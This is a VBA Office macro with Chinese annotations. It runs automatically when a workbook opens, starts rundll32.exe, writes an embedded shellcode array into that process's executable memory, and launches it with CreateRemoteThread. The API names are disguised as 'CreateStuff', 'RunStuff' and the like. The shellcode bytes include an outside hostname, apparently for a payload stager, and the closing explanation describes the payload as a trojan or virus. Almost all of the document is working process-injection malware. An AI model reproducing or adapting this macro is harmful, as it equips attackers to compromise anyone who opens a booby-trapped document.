‘# 声明数据结构：PROCESS_INFORMATION和STARTUPINFO是用于处理API调用的数据结构。这些结构体用于存储正在创建的进程和线程的信息

    Private Type PROCESS_INFORMATION
        hProcess As Long
        hThread As Long
        dwProcessId As Long
        dwThreadId As Long
    End Type

    Private Type STARTUPINFO
        cb As Long
        lpReserved As String
        lpDesktop As String
        lpTitle As String
        dwX As Long
        dwY As Long
        dwXSize As Long
        dwYSize As Long
        dwXCountChars As Long
        dwYCountChars As Long
        dwFillAttribute As Long
        dwFlags As Long
        wShowWindow As Integer
        cbReserved2 As Integer
        lpReserved2 As Long
        hStdInput As Long
        hStdOutput As Long
        hStdError As Long
    End Type

‘# API函数声明：使用Declare语句声明了多个Windows API，包括CreateRemoteThread、VirtualAllocEx、WriteProcessMemory和CreateProcessA，这允许VBA调用这些低级系统函数。

    #If VBA7 Then
        Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
        Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
        Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
        Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    #Else
        Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
        Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
        Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
        Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    #End If

‘# 主入口点：Auto_Open：
‘# 	该子程序在Excel打开时会自动执行。
‘# 	它定义了一个字节数组myArray，其中存储了待执行的机器代码（可能是已经编译好的共享库或DLL的内容）。

    Sub Auto_Open()
        Dim myByte As Long, myArray As Variant, offset As Long
        Dim pInfo As PROCESS_INFORMATION
        Dim sInfo As STARTUPINFO
        Dim sNull As String
        Dim sProc As String

‘# 条件编译指令，判断 VBA 的版本

    #If VBA7 Then
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Dim rwxpage As Long, res As Long
    #End If

‘# 定义字节数组，创建一个包含多个整数的数组，这些整数通常代表某段二进制代码。内容是ShellCode可执行内容

        myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
    -42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
    -58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-119,-3,-1,-1,110,120,115,97,102,101,56,56,56,56,46,105,99,117,0,58,-34,104,-79)

‘# 判断系统架构：通过检查环境变量ProgramW6432，确定操作系统是32位还是64位，并相应地选择rundll32.exe的位置。

        If Len(Environ("ProgramW6432")) > 0 Then
            sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
        Else
            sProc = Environ("windir") & "\\System32\\rundll32.exe"
        End If

‘# 创建进程：使用CreateProcessA函数启动rundll32.exe进程，并获得进程信息。

        res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

‘# 内存分配和写入:
‘#	使用VirtualAllocEx在新进程中分配可读、可写、可执行的内存页面。
‘#	遍历myArray，使用WriteProcessMemory将机器代码写入新进程的内存。

        rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
        For offset = LBound(myArray) To UBound(myArray)
            myByte = myArray(offset)
            res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
        Next offset

‘# 创建远程线程：使用CreateRemoteThread在新进程中创建一个线程，执行刚刚写入的代码

        res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)

‘#自动打开子程序，确保该宏会在工作簿打开时自动运行，达到自启动的目的

    End Sub
    Sub AutoOpen()
        Auto_Open
    End Sub
    Sub Workbook_Open()
        Auto_Open
    End Sub  


代码说明:

    该宏的主要作用是利用Windows的rundll32.exe进程执行恶意代码。具体步骤是：
        创建一个新的进程（rundll32.exe）。
        在该进程的地址空间中分配内存。
        将恶意代码（myArray中的字节）写入到新进程的内存。
        通过创建远程线程来执行这些代码。
    机器代码: myArray实际上包含一些二进制数据，是一种有效负载，比如木马、病毒或其他恶意软件